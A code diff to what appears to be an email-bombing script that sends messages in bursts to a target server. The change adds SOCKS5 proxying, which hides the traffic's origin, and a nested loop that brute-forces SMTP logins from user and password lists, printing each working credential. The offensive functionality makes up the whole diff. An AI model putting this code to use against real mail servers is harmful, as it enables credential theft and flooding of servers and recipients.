@@ -27,28 +27,72 @@ def sizeof_fmt(num: int, suffix: str = 'B') -> str:
     return "%.1f%s%s" % (num, 'Yi', suffix)
 
 
-def sendmail(number: int, burst: int, SB_FAILCOUNT, SB_MESSAGE: bytes):
+def sendmail(
+    number: int,
+    burst: int,
+    SB_FAILCOUNT,
+    SB_MESSAGE: bytes,
+    server: str = SB_SERVER,
+    proxy: str | None = None,
+    users=None,
+    passwords=None,
+):
     """Send a single email if failure threshold not reached."""
     if SB_FAILCOUNT.value >= SB_STOPFQNT and SB_STOPFAIL:
         return
 
     print(f"{number}/{SB_TOTAL}, Burst {burst} : Sending Email")
+    host, port = parse_server(server)
+    orig_socket = socket.socket
+    if proxy:
+        try:  # pragma: no cover - depends on PySocks
+            import socks
+
+            ph, pp = parse_server(proxy)
+            socks.setdefaultproxy(socks.SOCKS5, ph, pp)
+            socket.socket = socks.socksocket
+        except Exception:
+            pass
     try:
-        with smtplib.SMTP(SB_SERVER) as smtpObj:
+        with smtplib.SMTP(host, port) as smtpObj:
+            if users and passwords:
+                success = False
+                for user in users:
+                    for pwd in passwords:
+                        try:
+                            smtpObj.login(user, pwd)
+                            print(f"Auth success: {user}:{pwd}")
+                            success = True
+                            break
+                        except SMTPException:
+                            continue
+                    if success:
+                        break
             smtpObj.sendmail(SB_SENDER, SB_RECEIVERS, SB_MESSAGE)
         print(f"{number}/{SB_TOTAL}, Burst {burst} : Email Sent")
     except SMTPException:
         SB_FAILCOUNT.value += 1
-        print(f"{number}/{SB_TOTAL}, Burst {burst}/{SB_BURSTS} : Failure {SB_FAILCOUNT.value}/{SB_STOPFQNT}, Unable to send email")
+        print(
+            f"{number}/{SB_TOTAL}, Burst {burst}/{SB_BURSTS} : Failure {SB_FAILCOUNT.value}/{SB_STOPFQNT}, Unable to send email"
+        )
     except SMTPSenderRefused:
         SB_FAILCOUNT.value += 1
-        print(f"{number}/{SB_TOTAL}, Burst {burst} : Failure {SB_FAILCOUNT.value}/{SB_STOPFQNT}, Sender refused")
+        print(
+            f"{number}/{SB_TOTAL}, Burst {burst} : Failure {SB_FAILCOUNT.value}/{SB_STOPFQNT}, Sender refused"
+        )
     except SMTPRecipientsRefused:
         SB_FAILCOUNT.value += 1
-        print(f"{number}/{SB_TOTAL}, Burst {burst} : Failure {SB_FAILCOUNT.value}/{SB_STOPFQNT}, Recipients refused")
+        print(
+            f"{number}/{SB_TOTAL}, Burst {burst} : Failure {SB_FAILCOUNT.value}/{SB_STOPFQNT}, Recipients refused"
+        )
     except SMTPDataError:
         SB_FAILCOUNT.value += 1
-        print(f"{number}/{SB_TOTAL}, Burst {burst} : Failure {SB_FAILCOUNT.value}/{SB_STOPFQNT}, Data Error")
+        print(
+            f"{number}/{SB_TOTAL}, Burst {burst} : Failure {SB_FAILCOUNT.value}/{SB_STOPFQNT}, Data Error"
+        )
+    finally:
+        if proxy:
+            socket.socket = orig_socket
 
 
 def parse_server(server: str) -> Tuple[str, int]:
